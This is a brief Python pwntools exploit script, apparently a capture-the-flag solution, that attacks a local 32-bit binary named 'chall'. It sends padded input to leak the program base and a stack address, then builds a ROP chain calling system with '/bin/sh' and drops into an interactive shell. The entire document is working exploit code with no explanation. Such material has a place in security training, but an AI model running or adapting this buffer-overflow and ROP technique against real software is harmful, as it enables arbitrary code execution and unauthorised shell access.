from pwn import *
exe = context.binary = ELF("./chall")
r = process()
# sleep(15)
r.sendline("2")
r.sendline("500")
r.sendline("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
r.recvuntil(b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
exe.address = u32(r.recv(4)) - 0x200a
print(hex(exe.sym['system']))
r.sendline("2")
r.sendline("500")
r.sendline("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
r.recvuntil(b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
stack = u32(r.recv(4)) + 56 + 202 + 4 + 4
print(hex(stack))
rop = ROP(exe)
rop.raw(b"A" * 252)
rop.raw(stack)
rop.raw(exe.sym['system'])
rop.raw(exe.sym['exit'])
rop.raw(next(exe.search(b"/bin/sh")))
# sleep(15)
r.sendline("2")
r.sendline("500")
r.sendline(rop.chain())
r.sendline("3")
r.interactive()

# 0xffffd00c